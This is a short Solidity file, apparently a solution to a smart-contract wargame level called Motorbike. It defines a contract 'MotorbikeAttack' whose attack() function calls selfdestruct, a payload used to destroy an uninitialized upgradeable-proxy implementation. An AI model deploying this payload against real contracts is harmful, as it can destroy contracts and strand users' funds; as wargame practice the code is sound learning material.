// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

contract MotorbikeAttack {
    function attack() public {
        selfdestruct(msg.sender);
    }
    
}
